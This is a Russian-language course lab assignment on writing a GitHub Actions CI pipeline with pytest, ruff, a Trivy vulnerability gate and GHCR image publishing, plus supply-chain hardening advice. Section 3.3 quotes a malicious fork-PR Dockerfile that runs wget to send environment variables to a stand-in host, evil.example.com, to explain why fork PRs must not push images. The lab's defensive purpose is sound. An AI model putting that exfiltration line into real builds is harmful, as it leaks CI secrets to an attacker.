# Lab 3 — непрерывная интеграция с GitHub Actions

![difficulty](https://img.shields.io/badge/difficulty-beginner-success)
![topic](https://img.shields.io/badge/topic-CI/CD-blue)
![points](https://img.shields.io/badge/points-10%2B2-orange)
![tech](https://img.shields.io/badge/tech-GitHub%20Actions-informational)

> **Цель:** заведите pipeline (цепочка автоматической сборки и выкладки) для сервиса из Lab 1/2. Каждый push: test → lint → scan → build → publish, на чистом runner, автоматически.
> **Что сдаёте:** PR из `lab03`, который добавляет `.github/workflows/python-ci.yml`, `app_python/tests/`, `requirements-dev.txt`, защиту ветки и `app_python/docs/LAB03.md`.

---

## Обзор

Зелёная галочка на ноутбуке ничего не доказывает. CI гоняет *те же* шаги на *том же* runner для *каждого* коммита, и «у меня работает» перестаёт быть оправданием. Эта лабораторная проверяет навык **написать workflow GitHub Actions руками** — дописать последнее слово в чужом YAML здесь не считается.

В этой лабораторной вы:
- пишете тесты pytest на эндпоинты Lab 1 (настоящие проверки, не дымовой тест на импорт)
- собираете файл workflow GitHub Actions *от ключей*: `name`, `on`, `permissions`, `concurrency`, `jobs`, `steps`
- публикуете образы Docker в GHCR через `GITHUB_TOKEN` (без PAT, ротировать нечего)
- не пускаете merge без скана файловой системы Trivy
- ускоряете CI кэшем pip в `setup-python` и кэшем слоёв BuildKit в GHA

> ⚠️ **Границы:** шага deploy нет. CI публикует образ — кластер заберёт его в Lab 9+. Не собирайте здесь deploy-on-merge: в Lab 13 вы всё равно переделаете это через ArgoCD.

---

## Состояние проекта

**Из прошлых лабораторных у вас уже должно быть:**
- `app_python/` из Lab 1 — сервис Flask/FastAPI с `/` и `/health`
- `app_python/Dockerfile` из Lab 2 — multi-stage, non-root, локально собирается чисто
- `app_python/requirements.txt` — зависимости с зафиксированными версиями

**Эта лабораторная добавляет:**
- `app_python/requirements-dev.txt` — pytest, pytest-cov, ruff
- `app_python/tests/test_app.py` — настоящие проверки `/`, `/health` и ошибочного маршрута
- `.github/workflows/python-ci.yml` — pipeline (test → scan → build → push)
- защита ветки `main`, которая требует эти проверки
- `app_python/docs/LAB03.md` — отчёт к сдаче

К Lab 13 образ GHCR из этого pipeline — то, за чем следит ArgoCD. Стратегия тегов, которую вы выберете на этой неделе, — та, на которую потом опираются ваши выкладки.

---

## Подготовка

```bash
python --version            # 3.12+; the matrix tests 3.12 and 3.13
docker version              # 29.x; same as Lab 2
trivy --version             # v0.69.3 or later — NEVER v0.69.4 (see below)

# Local test of the workflow without pushing to GitHub:
brew install act           # macOS
# Linux: see https://github.com/nektos/act#installation
act --version              # 0.2.88+
```

В коммит попадут только эти новые пути:

```
.github/
└── workflows/
    └── python-ci.yml                  # the workflow you write
app_python/
├── requirements-dev.txt
├── tests/
│   └── test_app.py
└── docs/
    └── LAB03.md
```

---

## ⚠️ Заметка о безопасности цепочки поставок (прочитайте до задания 2)

CI запускает чужой код с доступом к секретам репозитория — action, которые вы запинили, **и есть** ваша поверхность атаки. Правила задают два свежих инцидента:

- **`tj-actions/changed-files` (CVE-2025-30066, 14–15 марта 2025)** — скомпрометированный релиз слил секреты из логов CI в **23 000+ репозиториях**. Каждый репозиторий, запиненный на `@main` или плавающий тег, подтянул вредоносный код сам. Исправлено в `v46.0.1`.
- **Trivy (CVE-2026-33634, 19 марта 2026)** — вредоносный бинарник **`v0.69.4`** попал на официальную страницу релизов GitHub после компрометации ключа подписи мейнтейнера. **Берите `v0.69.3` или более поздний пропатченный релиз — никогда `v0.69.4`.** Обёртка Action (`aquasecurity/trivy-action@v0.35.0`+) и `setup-trivy@v0.2.6`+ после инцидента безопасны.

**Что вы с этим делаете в лабораторной:**
- Запиньте ОС runner: `runs-on: ubuntu-24.04`, не `ubuntu-latest`.
- Запиньте action на мажорный тег: `actions/checkout@v4`. Для рискованных и сторонних action запиньте **полный SHA коммита** — тег атакующий может переставить, SHA нельзя.
- Сузьте `permissions:` до минимума, который нужен каждому job (`contents: read` по умолчанию; `packages: write` только на job, который пушит в GHCR).
- Никогда не пушьте образы из PR **из форков** — форк может переписать Dockerfile и вашим `GITHUB_TOKEN` опубликовать вредоносный образ в ваш namespace.

> 📌 Пример пина по SHA (комментарий оставляет его читаемым):
> ```yaml
> - uses: actions/checkout@11bd71901bbe5b1630ceea73d27597364c9af683 # v4.2.2
> ```

---

## Задание 1 — модульные тесты на pytest (2 балла)

### 1.1 — Выберите runner и обоснуйте выбор

Берите **pytest 8.3+**. Фикстуры и обычный `assert` для большинства проектов лучше шаблонного кода `unittest`, а `pytest-cov` ради бонуса подключается одной строкой. В `docs/LAB03.md` напишите один абзац: почему pytest, а не `unittest`.

### 1.2 — Напишите `requirements-dev.txt`

`ВАША ЗАДАЧА`: создайте `app_python/requirements-dev.txt` с **точно зафиксированными** версиями инструментов разработки — `pytest`, `pytest-cov` и линтер (`ruff` рекомендуется; `flake8` или `pylint` тоже принимаются). Форма `pkg==X.Y.Z`, без плавающих диапазонов; аргумент «зафиксируй версии» из Lab 2 действует и здесь.

### 1.3 — Напишите тесты, которые реально падают, когда приложение сломано

`ВАША ЗАДАЧА`: создайте `app_python/tests/test_app.py` минимум с тремя тестами. Каждый проверяет **поведение**, а не только успешный импорт:

| Тест | Что проверяет |
|------|---------|
| `GET /` | статус `200`, ответ — JSON, в теле **пять** ключей из Lab 1 (`service`, `system`, `runtime`, `request`, `endpoints`) |
| `GET /health` | статус `200`, в JSON-теле `status == "healthy"` |
| Неизвестный маршрут | статус `404`, тело — JSON (не HTML фреймворка по умолчанию — значит, обработчик ошибок из Lab 1 подключён) |

Подсказки (готового кода нет — написать тесты *и есть* навык):

- Flask: `app.test_client()` в `pytest.fixture`; у ответа — `r.get_json()`.
- FastAPI: `from fastapi.testclient import TestClient`; у ответа — `r.json()`.
- **Не** тестируйте внутренние хелперы. Тестируйте маршруты. Тест, который вызывает `get_uptime()` напрямую, не поймает опечатку в роутинге.
- **Не** проверяйте точное значение uptime: такой тест флапает. Проверяйте *форму* (например, `"uptime_seconds" in body["runtime"] and isinstance(..., int)`).

### 1.4 — Запустите их локально

```bash
cd app_python
python -m venv venv && source venv/bin/activate
pip install -r requirements.txt -r requirements-dev.txt
pytest -q
ruff check .
```

Оба должны завершиться с кодом `0`. Если код другой, исправляйте приложение. Тесты под результат не подгоняйте.

### 1.5 — Доказательство

**Вставьте в `docs/LAB03.md`:**

- вывод `pytest -q` (реальный прогон с вашей машины — минимум 3 точки, все прошли)
- вывод `ruff check .` (или `flake8 .`) — "All checks passed!" или эквивалент
- по одному предложению на тест: какое поведение он фиксирует (так позже не появится привычка «тест упал — удалим тест»)

---

## Задание 2 — тесты и линт в CI (3 балла)

Теперь подключите тесты к GitHub Actions. Файл workflow лежит в `.github/workflows/python-ci.yml`. Задания 2–4 дописывают **один и тот же файл**: задание 2 даёт job `test`, задание 3 добавляет `docker`, задание 4 подключает гейт Trivy.

### 2.1 — Разберитесь с ключами, прежде чем писать

У workflow пять ключей верхнего уровня, которые вы напишете:

| Ключ | Чем управляет | Значение в Lab 3 |
|-----|------------------|-------------|
| `name:` | Имя на вкладке Actions | свободная форма |
| `on:` | Триггеры | `push` в `main` **и** `pull_request` |
| `permissions:` | Что может `GITHUB_TOKEN` | начните с `contents: read`; `packages: write` выдавайте на конкретный job |
| `concurrency:` | Снятие устаревших прогонов | группа по ref, `cancel-in-progress: true` |
| `jobs:` | Работа | `test` (это задание), `docker` (задание 3) |

### 2.2 — Напишите каркас workflow

`ВАША ЗАДАЧА`: создайте `.github/workflows/python-ci.yml` и заполните каждый пропуск. Каркас показывает **форму** YAML — **значения и тела шагов** пишете вы. Не вставляйте workflow из интернета: проверяющий спросит, почему каждое значение именно такое.

```yaml
name: ___                              # YOUR TASK: workflow display name

on:
  ___:                                 # YOUR TASK: which event? push to main? branches filter?
    branches: [___]
    paths:                             # YOUR TASK: skip CI on docs-only commits
      - ___
      - ___
  ___:                                 # YOUR TASK: the other event (pull_request)
    paths:
      - ___
      - ___

permissions:
  contents: ___                        # YOUR TASK: minimum needed for checkout

concurrency:
  group: ___                           # YOUR TASK: how do you de-dup superseded runs on the SAME ref?
  cancel-in-progress: ___              # YOUR TASK: should an older run keep going? why/why not?

jobs:
  test:
    runs-on: ___                       # YOUR TASK: which runner? why pinned (not :latest)?
    strategy:
      fail-fast: ___                   # YOUR TASK: should 3.12 dying kill 3.13? what does that hide?
      matrix:
        python-version: [___, ___]     # YOUR TASK: which versions? (Lab 1 standardised on which?)

    steps:
      - uses: actions/checkout@___     # YOUR TASK: pin to major tag (or SHA — see supply-chain note)

      - uses: actions/setup-python@___
        with:
          python-version: ___          # YOUR TASK: reference the matrix value
          cache: ___                   # YOUR TASK: which cache mode does setup-python provide?
          cache-dependency-path: ___   # YOUR TASK: which file(s) does the cache key hash?
                                       #            (you install BOTH requirements.txt + requirements-dev.txt —
                                       #             cache must invalidate on either; YAML accepts a multi-line list)

      - name: ___                      # YOUR TASK: human-readable step name
        working-directory: ___         # YOUR TASK: which dir holds requirements*.txt + tests/?
        run: |
          # YOUR TASK: install both runtime and dev requirements
          # Hint: pip install -r requirements.txt -r requirements-dev.txt

      - name: ___                      # YOUR TASK: lint step name
        working-directory: ___         # YOUR TASK: same dir as install — ruff scans the code, not the repo root
        run: ___                       # YOUR TASK: ruff/flake8/pylint command

      - name: ___                      # YOUR TASK: test step name
        working-directory: ___         # YOUR TASK: same dir — without this, pytest finds 0 tests
        run: ___                       # YOUR TASK: pytest command (quiet mode? cov?)
```

> 💡 **Зачем `working-directory:` на каждом шаге?** Свежий runner стартует в корне репозитория (`$GITHUB_WORKSPACE`). Без `working-directory:` команда `pytest -q` идёт из корня и пишет **`collected 0 items`** — прогон зелёный и пустой по смыслу. Задайте каталог на каждом шаге, который трогает приложение (или один раз на уровне job через `defaults.run.working-directory`).

### 2.3 — Добавьте бейдж статуса

`ВАША ЗАДАЧА`: когда workflow один раз отработает на вашем форке, GitHub выдаст URL бейджа вида `https://github.com/<user>/<repo>/actions/workflows/python-ci.yml/badge.svg`. Добавьте его в начало `app_python/README.md` как markdown-картинку со ссылкой обратно на вкладку Actions. Например так.

```md
[![Python CI](https://github.com/<user>/<repo>/actions/workflows/python-ci.yml/badge.svg)](https://github.com/<user>/<repo>/actions/workflows/python-ci.yml)
```

### 2.4 — Проверьте локально через `act`, прежде чем пушить

Так вы сэкономите минуты на отладке CI:

```bash
act -l                                                                       # list jobs
act push -j test --matrix python-version:3.13 -P ubuntu-24.04=catthehacker/ubuntu:act-24.04
```

Если `act` падает, workflow сломан. Почините его до push.

### 2.5 — Доказательство

**Вставьте в `docs/LAB03.md`:**

- ссылку на зелёный прогон workflow на вашем форке (или вывод `act`, если CI на форке пока не заводится)
- полный файл workflow (или постоянную ссылку на него в репозитории)
- один абзац: почему фильтр триггера (`paths:`) именно такой — какие изменения *должны* запускать CI и какие не должны
- одно число: время установки с тёплым кэшем и с холодным (длительность шага "Set up Python" на втором прогоне и на первом)

---

## Задание 3 — сборка и публикация в GHCR (3 балла)

В Lab 2 образы пушили руками. CI делает это за вас: job `docker` собирает образ из Lab 2 и пушит его в GitHub Container Registry, аутентифицируясь автоматически выданным `GITHUB_TOKEN`. **Без PAT. Ротировать нечего.**

### 3.1 — Выберите стратегию тегов

`ВАША ЗАДАЧА`: до YAML решите:

- **SemVer** (`v1.4.2`, от `git tag`) — для библиотек и сервисов с внешними потребителями, которые вас пинят.
- **CalVer** (`2026.05.28`) — для сервисов, которые никто снаружи не пинит и где «ломающее изменение» по сути ни о чём.
- **Только SHA** (`git-a3f1b2c`) — у каждого коммита свой неизменяемый тег. Обязателен при любом выборе выше: воспроизводимые выкладки ссылаются именно на него.

Что бы вы ни выбрали, **`:latest` — удобный указатель, не релиз.** Не выкатывайте `:latest` туда, где это важно.

В `docs/LAB03.md` обоснуйте выбор в 2–3 предложениях.

### 3.2 — Напишите job docker

`ВАША ЗАДАЧА`: допишите job `docker` в `python-ci.yml`. Те же правила каркаса с пропусками: значения и тела шагов пишете вы.

```yaml
  docker:
    needs: ___                         # YOUR TASK: which job must pass first? Why?
    runs-on: ___                       # YOUR TASK: same runner as test? why same/different?
    if: ___                            # YOUR TASK: gate on event_name — DON'T push from PRs (esp. fork PRs)
    permissions:
      contents: ___                    # YOUR TASK
      packages: ___                    # YOUR TASK: what does GHCR push need?

    steps:
      - uses: actions/checkout@___

      - uses: docker/login-action@___  # YOUR TASK: pin
        with:
          registry: ___                # YOUR TASK: which registry host?
          username: ___                # YOUR TASK: which github context value?
          password: ___                # YOUR TASK: ephemeral token expression — NOT a PAT

      - uses: docker/metadata-action@___
        id: meta
        with:
          images: ___                  # YOUR TASK: ghcr.io/<owner>/<image-name>
                                       # Tip: `ghcr.io/${{ github.repository }}` gives `ghcr.io/<owner>/<repo>`,
                                       # which is fine. If you want the image name to match the `devops-info-service`
                                       # tag you pushed by hand in Lab 2 (so Lab 9's Deployment can pin one name),
                                       # use `ghcr.io/${{ github.repository_owner }}/devops-info-service` instead.
          tags: |
            # YOUR TASK: at least TWO tag patterns.
            # Pick from: type=sha,prefix=git-  |  type=semver,pattern={{version}}
            #            type=raw,value=latest,enable={{is_default_branch}}
            #            type=schedule,pattern={{date 'YYYY.MM.DD'}}
            ___
            ___

      - uses: docker/build-push-action@___
        with:
          context: ___                 # YOUR TASK: which dir holds the Dockerfile?
          push: ___                    # YOUR TASK: hardcode true, or use github.event_name? (see §3.3)
          tags: ___                    # YOUR TASK: feed in metadata-action output
          labels: ___                  # YOUR TASK: feed in metadata-action output (OCI labels)
          cache-from: ___              # YOUR TASK: which GHA cache mode?
          cache-to: ___                # YOUR TASK: which GHA cache mode + mode=max?
```

### 3.3 — Не пушьте из PR форков

`ВАША ЗАДАЧА`: `if:` на job docker (или аргумент `push:` у `build-push-action`) должен запрещать push, когда PR пришёл из форка. PR из форка может подменить Dockerfile на `FROM busybox; CMD wget evil.example.com/$(env)` и вашим `GITHUB_TOKEN` опубликовать это в ваш namespace.

Подсказка: `github.event_name != 'pull_request'` закрывает обычный случай; для более жёсткой схемы проверяйте `github.event.pull_request.head.repo.fork == false`.

### 3.4 — Доказательство

**Вставьте в `docs/LAB03.md`:**

- ссылку на зелёный прогон job `docker` (вкладка Actions)
- скриншот или URL пакета в разделе **ваш репозиторий → Packages** (`ghcr.io/<owner>/<repo>:<your-tag>`)
- список тегов, которые выдал прогон (скопируйте из логов шага metadata-action)
- 2–3 предложения, почему для этого сервиса SemVer или CalVer

---

## Задание 4 — гейт уязвимостей Trivy (2 балла)

Скан, который только предупреждает, все игнорируют. Сделайте из Trivy **гейт**: находка HIGH/CRITICAL роняет job и блокирует merge.

### 4.1 — Подключите Trivy в job test

`ВАША ЗАДАЧА`: добавьте шаг Trivy *внутрь* job `test` (или отдельный job `scan`, на который `docker` ссылается в `needs:`). Шаг должен отработать **до** job docker: уязвимая зависимость не должна попасть в опубликованный образ.

> 💡 **Матрица и скан:** если добавить Trivy внутрь матричного job `test`, он пробежит дважды (по разу на версию Python). Это лишний расход, на результат не влияет. Чтобы гонять его один раз, либо ограничьте условием `if: matrix.python-version == '3.13'`, либо вынесите в отдельный job `scan`, на который job `docker` ссылается в `needs:`.
>
> 🌐 **Зеркало БД в ограниченных сетях:** если runner не достучится до `ghcr.io/aquasecurity/trivy-db`, задайте `TRIVY_DB_REPOSITORY: public.ecr.aws/aquasecurity/trivy-db:2` в `env:` шага. Aqua публикует там анонимное зеркало (см. заметку в Lab 2).

```yaml
      - name: ___                                  # YOUR TASK: descriptive step name
        uses: aquasecurity/trivy-action@___        # YOUR TASK: version (>= 0.35.0; NEVER Trivy v0.69.4)
        with:
          scan-type: ___                           # YOUR TASK: fs or image? what do we have at this stage?
          scan-ref: ___                            # YOUR TASK: which path holds requirements.txt?
          severity: ___                            # YOUR TASK: which severities should block?
          exit-code: ___                           # YOUR TASK: what value turns this from warn into gate?
          ignore-unfixed: ___                      # YOUR TASK: skip CVEs with no patch? trade-off?
```

### 4.2 — Не заглушайте CVE, которые можно починить

`ВАША ЗАДАЧА`: если Trivy отмечает зависимость, **исправление живёт в PR**: поднимите версию в `requirements.txt`. Не замазывайте находку через `.trivyignore` и не поднимайте порог severity. По-настоящему непочинимые находки заведите в issue GitHub: ID CVE и дата.

### 4.3 — Защита ветки

`ВАША ЗАДАЧА`: в **Settings → Branches → Branch protection rules** для `main`:

- ✅ Требуйте pull request перед merge (≥ 1 review)
- ✅ Требуйте, чтобы status checks проходили — выберите **`test`** (каждая ячейка матрицы) и **`docker`**
- ✅ Требуйте, чтобы ветка была актуальной перед merge
- ✅ Не разрешайте обходить эти правила (админам тоже)

Зелёный бейдж CI — украшение. Гейт — это обязательные status checks.

### 4.4 — Доказательство

**Вставьте в `docs/LAB03.md`:**

- вывод шага Trivy с зелёного прогона (показательный, если вы уже всё починили: в выводе будет `0` находок)
- если поднимали зависимость — diff `requirements.txt` до и после
- скриншот настроек защиты ветки, где видны обязательные проверки
- по одному предложению на каждый пункт: выбор порога severity; компромисс `ignore-unfixed`

---

## Бонус — CI для нескольких приложений с фильтром путей и покрытие (2 балла)

Здесь вас меньше ведут за руку. Писать workflow вы уже умеете.

### Бонус.1 — Второй workflow для приложения на компилируемом языке (1 балл)

Если вы делали бонус Lab 1 (сосед на Go/Rust/Java), подключите его:

- Новый файл `.github/workflows/<lang>-ci.yml` той же формы: lint + test + (по желанию) сборка образа.
- **Оба** workflow фильтруют `paths:` на свой каталог приложения: коммит, который трогает только `app_python/`, не запускает workflow Go, и наоборот.
- Покажите выборочный запуск: по одному коммиту в каждом каталоге. На вкладке Actions срабатывает только нужный workflow.

### Бонус.2 — Покрытие в CI (1 балл)

- Запустите `pytest --cov=app_python --cov-report=xml --cov-report=term` в job `test`.
- Загрузите отчёт в **Codecov** (`codecov/codecov-action@v4` — бесплатно для публичных репозиториев) или в **Coveralls**.
- Добавьте бейдж покрытия в `app_python/README.md`.
- В `docs/LAB03.md` напишите процент покрытия и **одно предложение: что намеренно не покрыто и почему** (например, блоки `if __name__ == "__main__":`). Покрытие — не цель. Снова Fowler: *«полезно, чтобы находить код без тестов; как цель — бесполезно».*

---

## Как сдавать

```bash
git switch -c lab03
git add .github/workflows/python-ci.yml
git add app_python/tests/ app_python/requirements-dev.txt
git add app_python/docs/LAB03.md app_python/README.md
# bonus only:
git add .github/workflows/go-ci.yml          # if you did the language bonus
git commit -m "feat(lab03): CI pipeline — pytest, ruff, trivy gate, GHCR push"
git push -u origin lab03
```

Откройте **два** PR:

- `your-fork:lab03` → `course-repo:main` *(на ревью)*
- `your-fork:lab03` → `your-fork:main` *(сольётся в ваш main, когда закончите)*

CI запустится на обоих сам. В этом и смысл.

Чеклист PR:

```text
- [ ] Task 1 — pytest 3+ tests, ruff clean, output pasted in docs/LAB03.md
- [ ] Task 2 — workflow with on/permissions/concurrency/matrix; warm-cache time documented
- [ ] Task 3 — docker job needs:test, GHCR push works, ≥ 2 tags, no push from fork PRs
- [ ] Task 4 — Trivy gate with exit-code:"1", branch protection screenshot
- [ ] Bonus — second workflow with path filters AND coverage badge (if attempted)
```

---

## Критерии приёмки

### Задание 1 (2 балла)
- ✅ `requirements-dev.txt` с точным пином (`pytest==X.Y.Z`, не `>=`)
- ✅ три теста проверяют **поведение** (статус и форма тела), один из них — путь 404
- ✅ `pytest -q` и `ruff check .` локально проходят; выводы лежат в `docs/LAB03.md`

### Задание 2 (3 балла)
- ✅ `.github/workflows/python-ci.yml` срабатывает на `push` в `main` и на `pull_request`, с фильтром `paths:`
- ✅ группа `concurrency` по ref, `cancel-in-progress: true`
- ✅ матрица по Python 3.12 и 3.13, `fail-fast: false`
- ✅ `setup-python@v5` с `cache: pip` и заданным `cache-dependency-path:`
- ✅ бейдж статуса в `app_python/README.md`; ссылка на зелёный прогон

### Задание 3 (3 балла)
- ✅ у job `docker` есть `needs: test`
- ✅ используется `GITHUB_TOKEN` (без PAT), `permissions: { packages: write }` только на этом job
- ✅ `metadata-action@v5` выдаёт ≥ 2 тегов (один неизменяемый на коммит, например `git-<sha>`)
- ✅ `build-push-action@v6` с `cache-from/to: type=gha`
- ✅ образ виден в репозитории → Packages
- ✅ нет push из PR (особенно из PR форков)

### Задание 4 (2 балла)
- ✅ `aquasecurity/trivy-action@0.35.0` или новее (не Trivy v0.69.4)
- ✅ `severity: HIGH,CRITICAL`, `exit-code: "1"`, `ignore-unfixed: true`
- ✅ скан блокирует job docker (внутри `test` или через job `scan` и `needs:`)
- ✅ защита ветки требует проверки `test` и `docker`

### Бонус (2 балла)
- ✅ второй workflow с фильтром `paths:` на обоих и доказательство выборочного запуска
- ✅ XML покрытия собран, загружен в Codecov или Coveralls, бейдж есть в README

---

## Критерии оценивания

| Задание | Баллы | Критерии |
|------|-------:|----------|
| **Задание 1** — модульные тесты | **2** | Настоящие проверки, путь 404 покрыт, локально зелёное |
| **Задание 2** — job тестов и линта | **3** | Матрица, кэш pip, concurrency, фильтр путей; время тёплого кэша записано |
| **Задание 3** — сборка и push в GHCR | **3** | `needs: test`, `GITHUB_TOKEN`, ≥ 2 тегов, нет push из PR форка, образ виден |
| **Задание 4** — гейт Trivy | **2** | `exit-code: "1"`, гейт перед docker, защита ветки включена |
| **Бонус** | **2** | Несколько приложений с фильтром путей и покрытие |
| **Итого** | **12** | 10 основных + 2 бонуса |

**Оценивание:**
- **10/10:** все job зелёные, скан реально работает как гейт, тесты проверяют поведение, документация короткая и с живыми доказательствами
- **8–9/10:** CI работает, тесты хорошие, один мелкий пробел (например, забыли сузить `permissions`)
- **6–7/10:** CI запускается, но Trivy только предупреждает, нет защиты от PR форка или тесты тонкие
- **<6/10:** workflow не запускается, скана нет или он не гейтит, тесты не проверяют реальное поведение

**За полный балл:** тесты ловят настоящие баги · workflow, каждую строку которого вы можете защитить · `GITHUB_TOKEN`, а не PAT · Trivy роняет job на HIGH/CRITICAL · защита ветки реально включена.

---

## Материалы

<details>
<summary>📚 Документация</summary>

- [Документация GitHub Actions](https://docs.github.com/en/actions) · [Синтаксис workflow](https://docs.github.com/en/actions/using-workflows/workflow-syntax-for-github-actions)
- [Сборка и тесты Python](https://docs.github.com/en/actions/automating-builds-and-tests/building-and-testing-python)
- [Публикация в GHCR](https://docs.github.com/en/actions/publishing-packages/publishing-docker-images)
- [Усиление безопасности Actions](https://docs.github.com/en/actions/security-guides/security-hardening-for-github-actions)
- [pytest 8](https://docs.pytest.org/) · [Тестирование Flask](https://flask.palletsprojects.com/en/stable/testing/) · [Тестирование FastAPI](https://fastapi.tiangolo.com/tutorial/testing/)
- [Trivy](https://github.com/aquasecurity/trivy) · [`trivy-action`](https://github.com/aquasecurity/trivy-action) (берите ≥ v0.35.0) · альтернатива [Grype](https://github.com/anchore/grype)
- [SemVer](https://semver.org/) · [CalVer](https://calver.org/) · [`docker/metadata-action`](https://github.com/docker/metadata-action)
- [`act`](https://github.com/nektos/act) (локальный запуск Actions) · [`actionlint`](https://github.com/rhysd/actionlint) · [`gh`](https://cli.github.com/) (`gh run watch`)

</details>

<details>
<summary>⚠️ Типичные ловушки (с реальных пробных прогонов)</summary>

- **Пины на `@main` и плавающий тег** — `actions/checkout@main` позволяет компрометации upstream тихо попасть в ваш CI. Атака на `tj-actions/changed-files` в 2025 (CVE-2025-30066) ударила по 23 000+ репозиториям именно так. Пините мажорный тег (`@v4`); для рискованных сторонних action — **полный SHA коммита** с комментарием `# vX.Y.Z`.
- **`permissions:` не задан, и на старых репозиториях по умолчанию write-all** — репозитории, созданные до февраля 2023, по умолчанию дают токену workflow **чтение и запись всего**. Всегда объявляйте `permissions: { contents: read }` наверху и выдавайте `packages: write` только тому job, которому это нужно. Проверьте в **Settings → Actions → General → Workflow permissions**, что по умолчанию стоит "Read repository contents and packages permissions".
- **Push образов из PR форков** — форк может переписать Dockerfile так, чтобы команды `RUN` вытащили секреты, и вашим `GITHUB_TOKEN` опубликовать отравленный образ в ваш namespace GHCR. Закройте job docker условием `if: github.event_name != 'pull_request'` (или строже: `github.event.pull_request.head.repo.fork == false`).
- **Плавающий `trivy-action` и Trivy v0.69.4** — пин `trivy-action@master` или установка Trivy через `curl ... install.sh` 19–20 марта 2026 выполняли код атакующего на runner (CVE-2026-33634). Берите `aquasecurity/trivy-action@0.35.0+` и пините Trivy на **v0.69.3** или более позднюю пропатченную сборку.
- **Сбой загрузки БД Trivy в ограниченных сетях** — если runner не достучится до `ghcr.io/aquasecurity/trivy-db`, скан падает с `failed to download vulnerability DB`. Что делать: заранее стяните БД в приватное зеркало и задайте `TRIVY_DB_REPOSITORY=<your-mirror>` или поставьте ежедневный прогревочный workflow, который один раз гоняет Trivy на `main`.
- **`fail-fast: true` в матрице прячет регрессии** — значение по умолчанию `true` убивает 3.13 в ту же секунду, когда падает 3.12. Вы чините 3.12 и так и не видите, на чём собирался упасть 3.13. На матрице версий всегда ставьте `fail-fast: false`.
- **Попадания в кэш больше не инвалидируются** — если `cache-dependency-path:` смотрит не в тот файл (например, в `requirements.txt`, а вы обновили только `requirements-dev.txt`), хеш кэша не меняется, и ещё месяц ставятся старые версии. Укажите файл, который реально читает команда установки, или перечислите оба.
- **Тесты проходят, а `app.py` не импортируется** — pytest спокойно собирает ноль тестов, если в файле теста `SyntaxError`, и сообщает `0 passed`. Запускайте `pytest -q --strict-markers` и следите за предупреждением "collected 0 items" или проверяйте `len(tests) >= 3` в мета-тесте.
- **`pytest -q` пишет `0 passed`, потому что автоперезагрузка Flask проглотила ошибку импорта** — выключите `FLASK_DEBUG` в фикстуре теста: `app.config["TESTING"] = True; app.config["DEBUG"] = False`.
- **Под вами сменился `ubuntu-latest`** — Microsoft меняет алиас `latest` по своему графику. Workflow, который вчера был зелёным, внезапно падает: пропал `python3.10` или `apt-get` отвечает 404. Пините `ubuntu-24.04`.
- **`docker/metadata-action` только с `type=raw,value=latest`** — пушит один изменяемый тег и ничего неизменяемого. Всегда сочетайте `latest` с `type=sha,prefix=git-` (или `type=semver`), чтобы каждую сборку можно было проследить.

</details>

<details>
<summary>🛠️ Инструменты, которые стоит знать</summary>

- [`act`](https://github.com/nektos/act) — гоняет ваш workflow в локальном контейнере; обратная связь быстрее, чем push и молитва
- [`actionlint`](https://github.com/rhysd/actionlint) — линтит YAML workflow и ловит опечатки вроде `runs-on: ubunto-24.04` раньше, чем CI
- [`gh run watch`](https://cli.github.com/manual/gh_run_watch) — живой хвост запущенного workflow из терминала
- [`gh workflow run`](https://cli.github.com/manual/gh_workflow_run) — запускает прогон `workflow_dispatch` из оболочки
- [Dependabot](https://docs.github.com/en/code-security/dependabot) — сам открывает PR, чтобы `actions/checkout@v4` и `pytest` не протухали; один файл `.github/dependabot.yml`, без токена и без третьей стороны

</details>

---

## Что дальше

| Lab | Что CI делает для неё |
|---:|---|
| 4 | `terraform plan` становится гейтом CI — та же идея, что у `pytest` |
| 5–6 | `ansible-playbook --check` в CI; идемпотентность доказана на каждом PR |
| 7–8 | Интеграционные тесты, когда появятся Loki и Prometheus |
| 9–10 | CI проверяет манифесты Kubernetes и Helm-чарты (`helm lint`, `kubeval`) |
| 13 | ArgoCD следит за образом GHCR, который публикует **этот** pipeline, и петля GitOps замыкается |
| Каждая следующая лабораторная | этот workflow — ваша страховка |

> **Запомните:** хороший pipeline быстрый, детерминированный и скучный. Если в CI стало интересно — что-то не так.
